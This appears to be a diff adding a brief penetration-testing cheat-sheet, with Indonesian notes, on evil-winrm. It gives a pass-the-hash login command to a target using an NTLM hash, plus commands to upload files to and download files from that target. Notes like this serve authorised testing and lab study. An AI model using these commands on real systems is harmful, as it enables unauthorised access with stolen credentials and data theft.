@@ -1,0 +1,8 @@
+`evil-winrm -i IP-target -u username -H NTLM_hash`
+
+
+upload file ke target lewat evil-winrm
+`upload file.txt`
+
+download file dari target lewat evil-winrm
+`download file.txt`
